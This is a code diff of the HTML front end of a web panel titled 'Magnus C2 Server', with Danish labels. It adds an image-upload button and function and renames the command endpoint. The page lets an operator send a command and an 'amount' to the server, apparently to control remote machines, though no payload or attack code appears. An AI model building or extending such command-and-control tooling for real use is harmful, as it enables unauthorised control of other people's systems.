@@ -2,13 +2,12 @@
 
 <style>
     .sendButton {
-        width: 100px;
+        width: 150px;
         height: 30px;
-        background-color: blue;
         color: black;
         font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
         cursor: pointer;
-        font-size: large;
+        font-size: medium;
     }
 
     .title {
@@ -31,16 +30,20 @@
     <body>
         <div class="center">
             <h1 class="title">Magnus C2 Server</h1>
+            <input type="password" id="key" name="key" placeholder="Key">
             <h3 class="title">Command</h3>
             <input type="text" id="command" name="command" placeholder="Command">
             <input type="text" id="amount" name="amount" placeholder="Amount">
-            <h3>Vis billede</h3>
+            <br><br>
+            <button class="sendButton" style="background-color: blue;" onclick="sendCommand()">Send
+                Command!</button>
+            <h3 class="title">Vis billede</h3>
             <input type="file" id="image" name="image">
-
-            <input type="password" id="key" name="key" placeholder="Key">
+            <br><br>
+            <button class="sendButton" style="background-color: greenyellow;" onclick="sendImage()">Send
+                Billede!</button>
             <br>
             <br>
-            <button class="sendButton" onclick="sendCommand()">Send!</button>
         </div>
 
         <script>
@@ -58,6 +61,25 @@
                 }
             }
 
+            async function sendImage() {
+                if (!checkKey()) {
+                    alert("Forkert key!");
+                    return;
+                }
+
+                image = document.getElementById("image").value;
+
+                response = await fetch(`${document.URL}/post_image?key=${key}&image=${encodeURIComponent(image)}`,
+                    {
+                        method: "POST", headers: { "Accept": "application/json" }
+                    });
+                if (response.status == 200) {
+                    alert("Billede sendt!");
+                } else {
+                    alert("Ukendt fejl!");
+                }
+            }
+
             async function sendCommand() {
                 if (!checkKey()) {
                     alert("Forkert key!");
@@ -66,7 +88,7 @@
                 command = document.getElementById("command").value;
                 amount = document.getElementById("amount").value;
 
-                response = await fetch(`${document.URL}/post?key=${key}&command=${command}&amount=${amount}`,
+                response = await fetch(`${document.URL}/post_command?key=${key}&command=${command}&amount=${amount}`,
                     {
                         method: "POST", headers: { "Accept": "application/json" }
                     });
